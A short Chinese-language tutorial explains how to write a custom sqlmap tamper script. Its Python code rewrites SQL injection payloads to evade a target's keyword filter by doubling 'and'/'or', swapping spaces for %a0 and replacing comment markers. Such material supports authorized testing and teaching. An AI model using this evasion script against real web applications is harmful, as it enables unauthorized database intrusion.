自定义sqlmap

Sqlmap不能自动识别参数被过滤，因此需要先手动测试后，自定义一个脚本绕过过滤

在sqlmap 的tamper里新建一个.py文件

随便读取一个一个已有的文件作为模板，然后修改

#!/usr/bin/env python

"""

Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)

See the file 'LICENSE' for copying permission

"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():

pass

def tamper(payload, **kwargs):

"""

and aandnd

or oorr

<SPACE> %a0

# 1' and 1='1

-- 1' and '1

"""

payload = re.sub(r"(?i)-- ","and '1",payload)

payload = re.sub(r"(?i)and","aandnd",payload)

payload = re.sub(r"(?i)or","oorr",payload)

payload = re.sub(r" ","%a0",payload)

payload = re.sub(r"#","'1 and 1='1",payload)

return payload

使用这个脚本

此时sqlmap就能针对性地绕过目标的过滤
